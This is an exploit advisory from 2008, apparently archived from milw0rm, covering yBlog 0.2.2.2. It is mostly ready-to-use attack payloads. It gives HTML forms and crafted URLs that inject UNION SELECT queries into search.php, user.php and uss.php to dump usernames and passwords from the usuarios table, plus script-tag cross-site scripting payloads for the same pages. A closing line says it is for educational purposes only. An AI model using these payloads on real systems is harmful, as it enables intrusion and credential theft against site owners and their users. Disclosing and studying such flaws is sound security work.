@@ -1,0 +1,75 @@
+  _____ _   _ _____  _____ _____ _____  
+ /  ___| |_| |  _  \|  _  |  _  |_   _| 
+ | (___|  _  | [_)_/| (_) | (_) | | |   
+ \_____|_| |_|_| |_||_____|_____| |_|   
+        C. H. R. O. O. T.  SECURITY  GROUP
+        - -- ----- --- -- -- ---- --- -- - 
+                     http://www.chroot.org
+
+                          _   _ _ _____ ____ ____ __  _ 
+        Hacks In Taiwan  | |_| | |_   _|  __|    |  \| |
+        Conference 2008  |  _  | | | | | (__| () |     |
+                         |_| |_|_| |_| \____|____|_|\__|
+                                      http://www.hitcon.org
+
+
+Title =======:: yBlog 0.2.2.2 Multiple Remote Vulnerabilities
+
+Author ======:: unohope [at] chroot [dot] org
+
+IRC =========:: irc.chroot.org #chroot
+
+ScriptName ==:: yBlog
+
+Download ====:: http://nchc.dl.sourceforge.net/sourceforge/y-blog/yblog-0.2.2.2.tar.gz
+
+Mirror ======:: http://www.badongo.com/file/9705849
+
+______________________
+[SQL Injection]
+
+- {search.php} -
+
+<form action="http://localhost/yblog/search.php" method="post">
+  <input type="hidden" name="q" value="' union select 0,1,2,3,usuario,5,6,7,8,9,10,password,12,13,14,15,16 from usuarios/*">
+  <input type="submit" value="send">
+</form>
+
+<form action="http://localhost/yblog/search.php" method="post">
+  <input type="hidden" name="cn" value="1">
+  <input type="hidden" name="q" value="' union select 0,1,2,3,usuario,5,6,7,8,9,10,password,12,13,14,15,16 from usuarios/*">
+  <input type="submit" value="send">
+</form>
+
+- {user.php} -
+
+http://localhost/yblog/user.php?n=-99'+union+select+0,1,2,3,usuario,password,6,7,8,9,10,11,12,13,14,15,16+from+usuarios/*
+
+- {uss.php} -
+
+http://localhost/yblog/uss.php?action=2&done=1&n=-99'+union+select+0,1,2,usuario,password,5,6,7,8,9,10,11,12,13,14,15,16+from+usuarios+where+usuario='adm'/*
+
+______________________
+[Cross-Site Scripting]
+
+- {search.php} -
+
+<form action="http://localhost/yblog/search.php" method="post">
+  <input type="hidden" name="q" value="<script>alert(/xss/)</script>">
+  <input type="submit" value="send">
+</form>
+
+- {user.php} -
+
+http://localhost/yblog/user.php?n=<script>alert(/xss/)</script>
+
+- {uss.php} - 
+
+http://localhost/yblog/uss.php?action=2&done=1&n=<script>alert(/xss/)</script>
+
+______
+[NOTE]
+
+!! This is just for educational purposes, DO NOT use for illegal. !!
+
+# milw0rm.com [2008-06-10]
